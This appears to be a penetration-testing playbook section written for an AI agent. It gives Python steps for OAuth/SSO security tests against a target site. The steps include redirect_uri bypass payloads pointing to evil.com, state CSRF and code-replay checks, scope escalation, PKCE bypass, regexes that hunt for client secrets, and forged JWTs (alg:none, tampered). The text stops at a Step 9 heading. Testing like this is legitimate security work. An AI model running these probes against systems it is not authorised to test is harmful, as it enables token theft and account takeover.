**Phase 27 — OAuth / SSO Security Testing**

Run this phase ONLY if OAuth or SSO endpoints were detected during recon (Phase 1) or JS scanning
(Phase 4). This is CONDITIONAL — skip entirely if no OAuth/SSO indicators are found.

Each sub-test below is a SEPARATE run_python call. Do NOT skip any.

```python
# ── Step 0: OAuth/SSO Endpoint Discovery ─────────────────────────────────────
# Search crawled pages and JS files for OAuth/SSO indicators, then probe common paths.

from urllib.parse import urlparse, urlencode, parse_qs, urljoin, quote
import re, json, time

_G.setdefault('OAUTH_ENDPOINTS', [])
_G.setdefault('OAUTH_PROVIDERS', [])
_G.setdefault('OAUTH_INFO', {})

# ── 0a: Search crawled pages/JS for OAuth keywords ──────────────────────────
oauth_keywords = [
    'oauth', 'authorize', 'callback', 'redirect_uri', 'client_id',
    'access_token', 'refresh_token', 'grant_type', 'openid', 'id_token',
    'saml', 'sso', 'single sign', 'oidc', 'code_verifier', 'code_challenge',
    'nonce', 'response_type', 'authorization_code',
]

crawled_pages = _G.get('CRAWLED_PAGES', {})
js_files = _G.get('JS_FILES', [])
oauth_refs = []

for url, body in crawled_pages.items():
    body_lower = body.lower() if isinstance(body, str) else ''
    for kw in oauth_keywords:
        if kw in body_lower:
            oauth_refs.append((url, kw))

# Also check JS content stored during Phase 4
for js_url in js_files:
    try:
        r = session.get(js_url, timeout=10, verify=False)
        text_lower = r.text.lower()
        for kw in oauth_keywords:
            if kw in text_lower:
                oauth_refs.append((js_url, kw))
    except Exception:
        pass

if oauth_refs:
    print(f"[INFO] Found {len(oauth_refs)} OAuth/SSO keyword references in crawled content:")
    seen = set()
    for url, kw in oauth_refs[:20]:
        key = (url, kw)
        if key not in seen:
            seen.add(key)
            print(f"  {kw} in {url[:80]}")
else:
    print("[INFO] No OAuth keywords found in crawled pages/JS")

# ── 0b: Probe common OAuth/SSO paths ────────────────────────────────────────
oauth_paths = [
    '/oauth/authorize', '/oauth/token', '/oauth/callback',
    '/auth/callback', '/login/oauth', '/login/sso',
    '/auth/login', '/auth/authorize', '/auth/token',
    '/api/oauth/authorize', '/api/auth/callback',
    '/sso/login', '/sso/callback', '/sso/saml',
    '/saml/login', '/saml/acs', '/saml/metadata',
    '/.well-known/openid-configuration',
    '/.well-known/oauth-authorization-server',
    '/oauth2/authorize', '/oauth2/token', '/oauth2/callback',
    '/connect/authorize', '/connect/token',
]

for path in oauth_paths:
    try:
        url = BASE + path
        r = session.get(url, allow_redirects=False, timeout=8, verify=False)
        if r.status_code in (200, 301, 302, 303, 307, 308, 400, 401):
            _G['OAUTH_ENDPOINTS'].append({'url': url, 'status': r.status_code})
            print(f"[INFO] OAuth endpoint found: {url} (HTTP {r.status_code})")
            # Check for well-known config
            if 'openid-configuration' in path and r.status_code == 200:
                try:
                    config = r.json()
                    _G['OAUTH_INFO']['openid_config'] = config
                    print(f"  authorization_endpoint: {config.get('authorization_endpoint', 'N/A')}")
                    print(f"  token_endpoint: {config.get('token_endpoint', 'N/A')}")
                    print(f"  issuer: {config.get('issuer', 'N/A')}")
                    print(f"  grant_types_supported: {config.get('grant_types_supported', 'N/A')}")
                except Exception:
                    pass
    except Exception:
        pass
    time.sleep(0.2)

# ── 0c: Detect OAuth providers from redirect chains and page content ────────
provider_signatures = {
    'Google': ['accounts.google.com', 'googleapis.com/oauth'],
    'Facebook': ['facebook.com/v', 'facebook.com/dialog/oauth'],
    'GitHub': ['github.com/login/oauth'],
    'Azure AD': ['login.microsoftonline.com', 'login.windows.net'],
    'Okta': ['.okta.com/oauth', '.okta.com/authorize'],
    'Auth0': ['.auth0.com/authorize', '.auth0.com/oauth'],
    'Apple': ['appleid.apple.com/auth'],
    'Twitter/X': ['api.twitter.com/oauth', 'twitter.com/i/oauth'],
    'LinkedIn': ['linkedin.com/oauth'],
    'Keycloak': ['/realms/', '/protocol/openid-connect'],
}

# Check crawled page content and redirect locations for provider URLs
all_text = ' '.join(str(v) for v in crawled_pages.values())
for ep in _G['OAUTH_ENDPOINTS']:
    try:
        r = session.get(ep['url'], allow_redirects=True, timeout=10, verify=False)
        all_text += ' ' + r.url + ' ' + r.text[:5000]
    except Exception:
        pass

for provider, sigs in provider_signatures.items():
    for sig in sigs:
        if sig in all_text.lower():
            if provider not in _G['OAUTH_PROVIDERS']:
                _G['OAUTH_PROVIDERS'].append(provider)
            break

if _G['OAUTH_PROVIDERS']:
    print(f"[INFO] Detected OAuth providers: {', '.join(_G['OAUTH_PROVIDERS'])}")

if not _G['OAUTH_ENDPOINTS'] and not oauth_refs:
    print("[INFO] No OAuth/SSO endpoints or references found — SKIPPING remaining OAuth tests")
else:
    print(f"[+] OAuth endpoints found: {len(_G['OAUTH_ENDPOINTS'])}")
    print(f"[+] OAuth providers: {_G['OAUTH_PROVIDERS'] or 'none identified'}")
    print("[+] Proceeding with OAuth security tests")
```

```python
# ── Step 1: Open Redirect via redirect_uri manipulation ──────────────────────
# OAuth open redirects allow token theft by sending the auth code/token to an
# attacker-controlled URL. Severity: [HIGH] to [CRITICAL].
#
# FALSE POSITIVE WARNING: Only report if the server actually redirects to the
# attacker domain. A 400 error or "invalid redirect_uri" message is NOT a finding.

from urllib.parse import urlparse as _up

if not _G.get('OAUTH_ENDPOINTS'):
    print("[INFO] No OAuth endpoints — skipping redirect_uri tests")
else:
    target_host = _up(BASE).netloc.lower()
    _G.setdefault('_oauth_redirects', [])

    # Find authorization endpoints
    auth_endpoints = [ep['url'] for ep in _G['OAUTH_ENDPOINTS']
                      if 'authorize' in ep['url'] or 'auth' in ep['url']]
    if not auth_endpoints:
        auth_endpoints = [ep['url'] for ep in _G['OAUTH_ENDPOINTS'][:3]]

    # redirect_uri manipulation payloads
    redirect_payloads = [
        ('external domain',              'https://evil.com/callback'),
        ('subdomain confusion',          f'https://{target_host}.evil.com/callback'),
        ('at-sign bypass',               f'https://{target_host}@evil.com/callback'),
        ('path traversal',               f'https://{target_host}/callback/../../../evil.com'),
        ('double URL encoding',          f'https://{target_host}/callback%252f%252fevil.com'),
        ('backslash bypass',             f'https://{target_host}\\@evil.com/callback'),
        ('null byte',                    f'https://{target_host}/callback%00.evil.com'),
        ('fragment injection',           f'https://{target_host}/callback#@evil.com'),
        ('open redirect chain',          f'{BASE}/redirect?url=https://evil.com'),
        ('parameter pollution',          f'https://{target_host}/callback&redirect_uri=https://evil.com'),
        ('scheme change',                f'http://{target_host}/callback'),
        ('unicode normalization',        f'https://{target_host}/callback/..%c0%af..%c0%afevil.com'),
    ]

    for auth_ep in auth_endpoints:
        print(f"\n[*] Testing redirect_uri on: {auth_ep}")

        # First, get a baseline — find the expected client_id if possible
        try:
            r_base = session.get(auth_ep, allow_redirects=False, timeout=8, verify=False)
            # Try to extract client_id from the page or redirect
            loc = r_base.headers.get('Location', '')
            body = r_base.text[:3000]
            client_id_match = re.search(r'client_id[=:]\s*["\']?([a-zA-Z0-9._-]+)', loc + body)
            client_id = client_id_match.group(1) if client_id_match else 'test_client'
        except Exception:
            client_id = 'test_client'

        for label, payload in redirect_payloads:
            time.sleep(0.3)
            params = {
                'response_type': 'code',
                'client_id': client_id,
                'redirect_uri': payload,
                'scope': 'openid',
                'state': 'teststate123',
            }
            test_url = auth_ep + '?' + urlencode(params)

            try:
                r = session.get(test_url, allow_redirects=False, timeout=8, verify=False)
                loc = r.headers.get('Location', '')

                if loc:
                    loc_host = _up(loc).netloc.lower()

                    if 'evil.com' in loc_host:
                        print(f"[CRITICAL] redirect_uri open redirect: {label}")
                        print(f"  Payload: {payload}")
                        print(f"  Location: {loc[:200]}")
                        _G['_oauth_redirects'].append({
                            'url': test_url,
                            'label': label,
                            'payload': payload,
                            'location': loc,
                        })
                    elif 'error' in loc.lower() or 'invalid' in loc.lower():
                        print(f"  [OK] {label}: rejected (redirect to error page)")
                    else:
                        print(f"  [INFO] {label}: redirect to {loc[:80]}")
                elif r.status_code == 400:
                    body_lower = r.text.lower()[:500]
                    if 'invalid' in body_lower or 'redirect' in body_lower or 'mismatch' in body_lower:
                        print(f"  [OK] {label}: HTTP 400 — redirect_uri validation in place")
                    else:
                        print(f"  [INFO] {label}: HTTP 400 — {r.text[:100]}")
                else:
                    print(f"  [INFO] {label}: HTTP {r.status_code}")
            except Exception as e:
                print(f"  [ERROR] {label}: {e}")

    if _G['_oauth_redirects']:
        print(f"\n[!] Found {len(_G['_oauth_redirects'])} redirect_uri bypass(es)")
    else:
        print("\n[+] redirect_uri validation appears intact — no bypasses found")
```

```python
# ── Step 2: State Parameter (CSRF on OAuth) ─────────────────────────────────
# Missing or predictable state parameter = CSRF in OAuth flow.
# An attacker can force a victim to log in with the attacker's account.
# Severity: [HIGH] if state is missing or not validated.

if not _G.get('OAUTH_ENDPOINTS'):
    print("[INFO] No OAuth endpoints — skipping state parameter tests")
else:
    _G.setdefault('_oauth_state_vuln', False)

    auth_endpoints = [ep['url'] for ep in _G['OAUTH_ENDPOINTS']
                      if 'authorize' in ep['url'] or 'callback' in ep['url']]
    if not auth_endpoints:
        auth_endpoints = [ep['url'] for ep in _G['OAUTH_ENDPOINTS'][:3]]

    # Test 1: Callback without state parameter
    callback_endpoints = [ep['url'] for ep in _G['OAUTH_ENDPOINTS']
                          if 'callback' in ep['url']]

    for cb_url in callback_endpoints:
        print(f"\n[*] Testing state validation on: {cb_url}")

        # Send callback with a fake code but no state
        try:
            r_no_state = session.get(cb_url + '?code=FAKE_AUTH_CODE_12345',
                                     allow_redirects=False, timeout=8, verify=False)
            # Send callback with a fake code and bogus state
            r_bad_state = session.get(cb_url + '?code=FAKE_AUTH_CODE_12345&state=ATTACKER_STATE',
                                      allow_redirects=False, timeout=8, verify=False)

            no_state_ok = r_no_state.status_code in (200, 301, 302, 303, 307)
            bad_state_ok = r_bad_state.status_code in (200, 301, 302, 303, 307)

            # Check if response indicates successful processing (not an error)
            no_state_error = any(w in r_no_state.text.lower()[:500]
                                 for w in ['invalid state', 'state mismatch', 'csrf', 'state required'])
            bad_state_error = any(w in r_bad_state.text.lower()[:500]
                                  for w in ['invalid state', 'state mismatch', 'csrf', 'state required'])

            if no_state_ok and not no_state_error:
                print(f"[HIGH] Callback accepted request WITHOUT state parameter (HTTP {r_no_state.status_code})")
                print(f"  This allows CSRF attacks on the OAuth login flow")
                _G['_oauth_state_vuln'] = True
            else:
                print(f"  [OK] Missing state rejected (HTTP {r_no_state.status_code})")

            if bad_state_ok and not bad_state_error:
                print(f"[HIGH] Callback accepted BOGUS state parameter (HTTP {r_bad_state.status_code})")
                print(f"  State parameter not validated server-side")
                _G['_oauth_state_vuln'] = True
            else:
                print(f"  [OK] Invalid state rejected")

        except Exception as e:
            print(f"  [ERROR] {e}")

    # Test 2: Check authorization endpoints for state in the flow
    for auth_ep in auth_endpoints:
        if 'callback' in auth_ep:
            continue
        try:
            r = session.get(auth_ep, allow_redirects=False, timeout=8, verify=False)
            loc = r.headers.get('Location', '')
            if loc and 'state=' not in loc and r.status_code in (301, 302, 303, 307):
                print(f"[MEDIUM] Authorization redirect does not include state parameter")
                print(f"  Endpoint: {auth_ep}")
                print(f"  Redirect: {loc[:150]}")
        except Exception:
            pass

    if not _G['_oauth_state_vuln']:
        print("[+] State parameter validation appears correct")
```

```python
# ── Step 3: Authorization Code Replay ────────────────────────────────────────
# OAuth authorization codes MUST be single-use. Replaying a code should fail.
# Severity: [HIGH] if auth codes can be reused.
#
# NOTE: This test requires observing a real auth code. If none was captured
# during crawling, we test with a synthetic code (less reliable but still checks
# server behavior).

if not _G.get('OAUTH_ENDPOINTS'):
    print("[INFO] No OAuth endpoints — skipping code replay test")
else:
    _G.setdefault('_oauth_code_replay', False)

    token_endpoints = [ep['url'] for ep in _G['OAUTH_ENDPOINTS']
                       if 'token' in ep['url']]
    callback_endpoints = [ep['url'] for ep in _G['OAUTH_ENDPOINTS']
                          if 'callback' in ep['url']]

    # Try to exchange a test code at the token endpoint
    for token_ep in token_endpoints:
        print(f"\n[*] Testing code replay on token endpoint: {token_ep}")
        test_code = 'REPLAY_TEST_CODE_12345'
        token_data = {
            'grant_type': 'authorization_code',
            'code': test_code,
            'redirect_uri': BASE + '/callback',
            'client_id': _G.get('OAUTH_INFO', {}).get('client_id', 'test_client'),
        }

        try:
            # First exchange attempt
            r1 = session.post(token_ep, data=token_data, timeout=8, verify=False)
            # Second exchange attempt (same code)
            r2 = session.post(token_ep, data=token_data, timeout=8, verify=False)

            if r1.status_code == 200 and r2.status_code == 200:
                try:
                    d1 = r1.json()
                    d2 = r2.json()
                    if 'access_token' in d1 and 'access_token' in d2:
                        print(f"[HIGH] Auth code accepted TWICE — code replay possible!")
                        print(f"  First response: {str(d1)[:200]}")
                        print(f"  Second response: {str(d2)[:200]}")
                        _G['_oauth_code_replay'] = True
                    elif 'error' in d2:
                        print(f"  [OK] Second attempt rejected: {d2.get('error', '')}")
                except Exception:
                    pass
            elif r1.status_code == 200 and r2.status_code != 200:
                print(f"  [OK] Code reuse blocked on second attempt (HTTP {r2.status_code})")
            else:
                print(f"  [INFO] Both requests returned HTTP {r1.status_code}/{r2.status_code}")
                print(f"  (Test code was synthetic — cannot confirm replay vulnerability)")
        except Exception as e:
            print(f"  [ERROR] {e}")

    # Also check callback endpoints for code reuse
    for cb_url in callback_endpoints:
        print(f"\n[*] Testing code replay on callback: {cb_url}")
        test_code = 'REPLAY_TEST_CALLBACK_CODE'
        try:
            r1 = session.get(cb_url + f'?code={test_code}&state=test',
                             allow_redirects=False, timeout=8, verify=False)
            time.sleep(0.5)
            r2 = session.get(cb_url + f'?code={test_code}&state=test',
                             allow_redirects=False, timeout=8, verify=False)

            if r1.status_code == r2.status_code and r1.status_code in (200, 302):
                # Check if second response indicates error
                if 'error' in r2.text.lower()[:500] or 'invalid' in r2.text.lower()[:500]:
                    print(f"  [OK] Second code use returned error message")
                elif 'error' not in r1.text.lower()[:500]:
                    print(f"  [MEDIUM] Both callback attempts returned HTTP {r1.status_code} without error")
                    print(f"  Investigate manually — code may be reusable")
            else:
                print(f"  [INFO] HTTP {r1.status_code} then {r2.status_code}")
        except Exception as e:
            print(f"  [ERROR] {e}")

    if not _G['_oauth_code_replay']:
        print("\n[+] No confirmed authorization code replay vulnerability")
```

```python
# ── Step 4: Token Leakage ────────────────────────────────────────────────────
# Check for access tokens, auth codes, or credentials leaked in:
# - URL fragments / query strings (visible in Referer header, browser history, logs)
# - Error pages
# - Server response headers
# Severity: [HIGH] if tokens appear in URLs, [MEDIUM] for other leakage.

if not _G.get('OAUTH_ENDPOINTS'):
    print("[INFO] No OAuth endpoints — skipping token leakage tests")
else:
    _G.setdefault('_oauth_token_leaks', [])

    # Test 1: Check if authorization endpoint uses response_type=token (implicit flow)
    auth_endpoints = [ep['url'] for ep in _G['OAUTH_ENDPOINTS']
                      if 'authorize' in ep['url']]

    for auth_ep in auth_endpoints:
        print(f"\n[*] Testing implicit flow on: {auth_ep}")
        params = {
            'response_type': 'token',
            'client_id': _G.get('OAUTH_INFO', {}).get('client_id', 'test_client'),
            'redirect_uri': BASE + '/callback',
            'scope': 'openid',
        }
        try:
            r = session.get(auth_ep + '?' + urlencode(params),
                            allow_redirects=False, timeout=8, verify=False)
            loc = r.headers.get('Location', '')
            if 'access_token=' in loc:
                print(f"[HIGH] Implicit flow enabled — access_token in redirect URL fragment!")
                print(f"  Location: {loc[:200]}")
                print(f"  Implicit flow is deprecated (OAuth 2.1) — tokens leak via browser history/Referer")
                _G['_oauth_token_leaks'].append({
                    'type': 'implicit_flow',
                    'url': auth_ep,
                    'evidence': f'access_token in redirect: {loc[:200]}',
                })
            elif 'unsupported_response_type' in loc.lower() or 'unsupported_response_type' in r.text.lower()[:500]:
                print(f"  [OK] Implicit flow (response_type=token) rejected")
            else:
                print(f"  [INFO] HTTP {r.status_code} — {loc[:100] if loc else r.text[:100]}")
        except Exception as e:
            print(f"  [ERROR] {e}")

    # Test 2: Check for tokens in URL query parameters on callback endpoints
    callback_endpoints = [ep['url'] for ep in _G['OAUTH_ENDPOINTS']
                          if 'callback' in ep['url']]
    for cb_url in callback_endpoints:
        try:
            r = session.get(cb_url, allow_redirects=True, timeout=8, verify=False)
            final_url = r.url
            if 'access_token=' in final_url or 'token=' in final_url:
                print(f"[HIGH] Token visible in final URL: {final_url[:200]}")
                _G['_oauth_token_leaks'].append({
                    'type': 'token_in_url',
                    'url': final_url[:200],
                    'evidence': 'Token visible in URL query string',
                })
        except Exception:
            pass

    # Test 3: Check error responses for token/secret leakage
    for ep in _G['OAUTH_ENDPOINTS']:
        try:
            # Send malformed request to trigger error page
            r = session.get(ep['url'] + '?error=test&error_description=test',
                            timeout=8, verify=False)
            text = r.text.lower()[:3000]
            # Look for secrets in error pages
            secret_patterns = [
                (r'client_secret[=:]\s*["\']?[a-zA-Z0-9_-]{10,}', 'client_secret in error page'),
                (r'access_token[=:]\s*["\']?[a-zA-Z0-9._-]{10,}', 'access_token in error page'),
                (r'refresh_token[=:]\s*["\']?[a-zA-Z0-9._-]{10,}', 'refresh_token in error page'),
                (r'Bearer\s+[a-zA-Z0-9._-]{20,}', 'Bearer token in error page'),
            ]
            for pattern, label in secret_patterns:
                match = re.search(pattern, r.text, re.IGNORECASE)
                if match:
                    print(f"[HIGH] {label}: {match.group()[:80]}")
                    _G['_oauth_token_leaks'].append({
                        'type': 'error_page_leak',
                        'url': ep['url'],
                        'evidence': f'{label}: {match.group()[:80]}',
                    })
        except Exception:
            pass

    # Test 4: Check Referer leakage — if callback page has external links, tokens leak
    for cb_url in callback_endpoints:
        try:
            r = session.get(cb_url + '?code=testcode&state=teststate',
                            timeout=8, verify=False)
            # Check if page has external links (which would send Referer with code)
            external_links = re.findall(r'(?:href|src)=["\']?(https?://[^"\'>\s]+)', r.text)
            target_host = _up(BASE).netloc.lower()
            ext_domains = [_up(l).netloc for l in external_links
                           if _up(l).netloc.lower() != target_host and _up(l).netloc]
            if ext_domains:
                unique_ext = list(set(ext_domains))[:5]
                print(f"[MEDIUM] Callback page has external links — Referer may leak auth code")
                print(f"  External domains: {unique_ext}")
                print(f"  If code is in URL, it leaks to these domains via Referer header")
                # Check for Referrer-Policy header
                ref_policy = r.headers.get('Referrer-Policy', '')
                if ref_policy in ('no-referrer', 'same-origin', 'strict-origin'):
                    print(f"  [OK] Referrer-Policy: {ref_policy} — mitigates Referer leakage")
                elif ref_policy:
                    print(f"  [INFO] Referrer-Policy: {ref_policy}")
                else:
                    print(f"  [MEDIUM] No Referrer-Policy header — Referer leakage not mitigated")
        except Exception:
            pass

    if _G['_oauth_token_leaks']:
        print(f"\n[!] Found {len(_G['_oauth_token_leaks'])} token leakage issue(s)")
    else:
        print("\n[+] No token leakage detected")
```

```python
# ── Step 5: Scope Escalation ─────────────────────────────────────────────────
# Request higher scopes/permissions than the client is authorized for.
# Severity: [HIGH] if elevated scopes are granted.

if not _G.get('OAUTH_ENDPOINTS'):
    print("[INFO] No OAuth endpoints — skipping scope escalation tests")
else:
    auth_endpoints = [ep['url'] for ep in _G['OAUTH_ENDPOINTS']
                      if 'authorize' in ep['url']]

    escalation_scopes = [
        'admin', 'write', 'read write', 'openid profile email admin',
        'user:admin', 'scope:admin', 'read write delete',
        'offline_access', 'all', '*',
        'openid profile email phone address',
    ]

    for auth_ep in auth_endpoints:
        print(f"\n[*] Testing scope escalation on: {auth_ep}")
        for scope in escalation_scopes:
            try:
                params = {
                    'response_type': 'code',
                    'client_id': _G.get('OAUTH_INFO', {}).get('client_id', 'test_client'),
                    'redirect_uri': BASE + '/callback',
                    'scope': scope,
                    'state': 'test_state',
                }
                r = session.get(auth_ep + '?' + urlencode(params),
                                allow_redirects=False, timeout=8, verify=False)
                loc = r.headers.get('Location', '')

                if r.status_code in (301, 302, 303, 307):
                    if 'invalid_scope' in loc.lower() or 'error' in loc.lower():
                        print(f"  [OK] Scope '{scope}' rejected")
                    elif 'code=' in loc:
                        print(f"  [HIGH] Scope '{scope}' may have been granted — auth code returned!")
                        print(f"  Location: {loc[:150]}")
                    else:
                        print(f"  [INFO] Scope '{scope}': redirect to {loc[:80]}")
                elif r.status_code == 200:
                    # Consent screen — check if elevated scope is shown
                    if scope.lower() in r.text.lower()[:3000]:
                        print(f"  [MEDIUM] Scope '{scope}' presented in consent screen — server accepts it")
                elif r.status_code == 400:
                    body_lower = r.text.lower()[:500]
                    if 'invalid_scope' in body_lower or 'scope' in body_lower:
                        print(f"  [OK] Scope '{scope}' explicitly rejected")
                    else:
                        print(f"  [INFO] Scope '{scope}': HTTP 400")
            except Exception as e:
                print(f"  [ERROR] Scope '{scope}': {e}")
            time.sleep(0.3)
```

```python
# ── Step 6: PKCE Bypass ──────────────────────────────────────────────────────
# If PKCE (Proof Key for Code Exchange) is required, test without code_verifier.
# If the token endpoint accepts a code without code_verifier = [HIGH] PKCE bypass.

if not _G.get('OAUTH_ENDPOINTS'):
    print("[INFO] No OAuth endpoints — skipping PKCE bypass test")
else:
    token_endpoints = [ep['url'] for ep in _G['OAUTH_ENDPOINTS']
                       if 'token' in ep['url']]
    auth_endpoints = [ep['url'] for ep in _G['OAUTH_ENDPOINTS']
                      if 'authorize' in ep['url']]

    # Check if PKCE is advertised in OpenID config
    oidc_config = _G.get('OAUTH_INFO', {}).get('openid_config', {})
    pkce_methods = oidc_config.get('code_challenge_methods_supported', [])
    if pkce_methods:
        print(f"[INFO] PKCE methods advertised: {pkce_methods}")

    # Test 1: Request authorization without code_challenge
    for auth_ep in auth_endpoints:
        print(f"\n[*] Testing PKCE enforcement on: {auth_ep}")
        params_no_pkce = {
            'response_type': 'code',
            'client_id': _G.get('OAUTH_INFO', {}).get('client_id', 'test_client'),
            'redirect_uri': BASE + '/callback',
            'scope': 'openid',
            'state': 'test_state',
        }
        try:
            r = session.get(auth_ep + '?' + urlencode(params_no_pkce),
                            allow_redirects=False, timeout=8, verify=False)
            loc = r.headers.get('Location', '')
            body_lower = r.text.lower()[:500]

            if 'code_challenge' in body_lower or 'pkce' in body_lower:
                print(f"  [OK] Server requires PKCE — rejected request without code_challenge")
            elif r.status_code in (301, 302, 303, 307) and 'code=' in loc:
                print(f"  [MEDIUM] Auth code issued WITHOUT code_challenge — PKCE not enforced")
            elif r.status_code in (301, 302, 303, 307):
                print(f"  [INFO] Redirect without code_challenge: {loc[:100]}")
            else:
                print(f"  [INFO] HTTP {r.status_code} without code_challenge")
        except Exception as e:
            print(f"  [ERROR] {e}")

    # Test 2: Token exchange without code_verifier
    for token_ep in token_endpoints:
        print(f"\n[*] Testing token exchange without code_verifier: {token_ep}")
        token_data = {
            'grant_type': 'authorization_code',
            'code': 'FAKE_CODE_PKCE_TEST',
            'redirect_uri': BASE + '/callback',
            'client_id': _G.get('OAUTH_INFO', {}).get('client_id', 'test_client'),
            # Deliberately omitting code_verifier
        }
        try:
            r = session.post(token_ep, data=token_data, timeout=8, verify=False)
            body_lower = r.text.lower()[:500]

            if 'code_verifier' in body_lower or 'pkce' in body_lower:
                print(f"  [OK] Token endpoint requires code_verifier — PKCE enforced")
            elif r.status_code == 200 and 'access_token' in body_lower:
                print(f"  [HIGH] Token issued WITHOUT code_verifier — PKCE bypass confirmed!")
                print(f"  Response: {r.text[:200]}")
            elif 'invalid_grant' in body_lower or 'invalid' in body_lower:
                print(f"  [INFO] Invalid code (expected with test code) — cannot confirm PKCE status")
            else:
                print(f"  [INFO] HTTP {r.status_code}: {r.text[:150]}")
        except Exception as e:
            print(f"  [ERROR] {e}")

    # Test 3: Downgrade code_challenge_method from S256 to plain
    for auth_ep in auth_endpoints:
        print(f"\n[*] Testing PKCE method downgrade (S256 -> plain): {auth_ep}")
        params_plain = {
            'response_type': 'code',
            'client_id': _G.get('OAUTH_INFO', {}).get('client_id', 'test_client'),
            'redirect_uri': BASE + '/callback',
            'scope': 'openid',
            'state': 'test_state',
            'code_challenge': 'plaintext_challenge_test',
            'code_challenge_method': 'plain',
        }
        try:
            r = session.get(auth_ep + '?' + urlencode(params_plain),
                            allow_redirects=False, timeout=8, verify=False)
            loc = r.headers.get('Location', '')
            body_lower = r.text.lower()[:500]

            if 'code=' in loc:
                print(f"  [MEDIUM] Server accepts plain code_challenge_method — weaker PKCE")
            elif 'invalid' in body_lower or 'S256' in r.text[:500]:
                print(f"  [OK] Server rejects plain method — requires S256")
            else:
                print(f"  [INFO] HTTP {r.status_code}")
        except Exception as e:
            print(f"  [ERROR] {e}")
```

```python
# ── Step 7: Client Secret Exposure ───────────────────────────────────────────
# Check JS files, API responses, and page source for leaked client_secret values.
# Client secrets in client-side code = [HIGH] — allows impersonation.

if not _G.get('OAUTH_ENDPOINTS') and not _G.get('JS_FILES'):
    print("[INFO] No OAuth endpoints/JS files — skipping client secret scan")
else:
    _G.setdefault('_oauth_secret_leaks', [])

    secret_patterns = [
        (r'client_secret\s*[=:]\s*["\']([a-zA-Z0-9_\-/.]{8,})["\']', 'client_secret'),
        (r'clientSecret\s*[=:]\s*["\']([a-zA-Z0-9_\-/.]{8,})["\']', 'clientSecret'),
        (r'CLIENT_SECRET\s*[=:]\s*["\']([a-zA-Z0-9_\-/.]{8,})["\']', 'CLIENT_SECRET'),
        (r'app_secret\s*[=:]\s*["\']([a-zA-Z0-9_\-/.]{8,})["\']', 'app_secret'),
        (r'consumer_secret\s*[=:]\s*["\']([a-zA-Z0-9_\-/.]{8,})["\']', 'consumer_secret'),
    ]

    # Scan JS files
    js_files = _G.get('JS_FILES', [])
    for js_url in js_files:
        try:
            r = session.get(js_url, timeout=10, verify=False)
            for pattern, label in secret_patterns:
                matches = re.findall(pattern, r.text)
                for match in matches:
                    print(f"[HIGH] {label} found in JS file!")
                    print(f"  File: {js_url}")
                    print(f"  Value: {match[:40]}...")
                    _G['_oauth_secret_leaks'].append({
                        'type': label,
                        'url': js_url,
                        'value': match[:40],
                    })
        except Exception:
            pass

    # Scan crawled HTML pages
    crawled_pages = _G.get('CRAWLED_PAGES', {})
    for page_url, body in crawled_pages.items():
        if not isinstance(body, str):
            continue
        for pattern, label in secret_patterns:
            matches = re.findall(pattern, body)
            for match in matches:
                print(f"[HIGH] {label} found in page source!")
                print(f"  Page: {page_url}")
                print(f"  Value: {match[:40]}...")
                _G['_oauth_secret_leaks'].append({
                    'type': label,
                    'url': page_url,
                    'value': match[:40],
                })

    # Scan OAuth endpoint responses
    for ep in _G.get('OAUTH_ENDPOINTS', []):
        try:
            r = session.get(ep['url'], timeout=8, verify=False)
            for pattern, label in secret_patterns:
                matches = re.findall(pattern, r.text)
                for match in matches:
                    print(f"[HIGH] {label} found in OAuth endpoint response!")
                    print(f"  Endpoint: {ep['url']}")
                    print(f"  Value: {match[:40]}...")
                    _G['_oauth_secret_leaks'].append({
                        'type': label,
                        'url': ep['url'],
                        'value': match[:40],
                    })
        except Exception:
            pass

    if _G['_oauth_secret_leaks']:
        print(f"\n[!] Found {len(_G['_oauth_secret_leaks'])} client secret leak(s)")
    else:
        print("\n[+] No client secrets found in client-side code or responses")
```

```python
# ── Step 8: Token Validation Tests ───────────────────────────────────────────
# Send invalid, expired, or modified tokens to protected endpoints.
# Severity: [CRITICAL] if invalid tokens are accepted.

if not _G.get('OAUTH_ENDPOINTS'):
    print("[INFO] No OAuth endpoints — skipping token validation tests")
else:
    # Find endpoints that accept Bearer tokens
    protected_endpoints = _G.get('PROTECTED_ENDPOINTS', [])
    if not protected_endpoints:
        # Try common API endpoints
        protected_endpoints = [
            BASE + '/api/me', BASE + '/api/user', BASE + '/api/profile',
            BASE + '/api/v1/user', BASE + '/userinfo', BASE + '/api/account',
        ]

    invalid_tokens = [
        ('empty token',       ''),
        ('literal "null"',    'null'),
        ('literal "undefined"', 'undefined'),
        ('all zeros',         '0000000000000000'),
        ('single char',       'a'),
        ('expired JWT',       'eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIiwiZXhwIjoxfQ.invalid'),
        ('alg:none JWT',      'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.'),
        ('tampered JWT',      'eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.tampered'),
        ('SQL in token',      "' OR '1'='1"),
    ]

    _G.setdefault('_oauth_token_bypass', False)

    for ep_url in protected_endpoints[:5]:
        print(f"\n[*] Testing token validation on: {ep_url}")

        # First establish baseline — no auth
        try:
            r_noauth = session.get(ep_url, timeout=8, verify=False,
                                   headers={'Authorization': ''})
            baseline_status = r_noauth.status_code
            baseline_len = len(r_noauth.text)
            print(f"  Baseline (no auth): HTTP {baseline_status} ({baseline_len}b)")

            if baseline_status in (404, 500):
                print(f"  [INFO] Endpoint not found or errored — skipping")
                continue
        except Exception:
            continue

        for label, token in invalid_tokens:
            try:
                headers = {'Authorization': f'Bearer {token}'} if token else {}
                r = session.get(ep_url, headers=headers, timeout=8, verify=False)

                if r.status_code == 200 and baseline_status in (401, 403):
                    # Got 200 with invalid token but 401 without — access bypass!
                    print(f"  [CRITICAL] '{label}' accepted! Got HTTP 200 (baseline was {baseline_status})")
                    print(f"  Response: {r.text[:200]}")
                    _G['_oauth_token_bypass'] = True
                elif r.status_code == 200 and len(r.text) != baseline_len:
                    print(f"  [MEDIUM] '{label}': HTTP 200 with different content length ({len(r.text)}b vs {baseline_len}b)")
                elif r.status_code in (401, 403):
                    pass  # Expected — token rejected
                else:
                    pass  # Not interesting
            except Exception:
                pass
            time.sleep(0.2)

    if _G['_oauth_token_bypass']:
        print(f"\n[!] Token validation bypass confirmed!")
    else:
        print(f"\n[+] Token validation appears correct — invalid tokens rejected")
```

```python
# ── Step 9: JWT-based OAuth Token Attacks ────────────────────────────────────
# If OAuth tokens are JWTs, apply common JWT attacks.
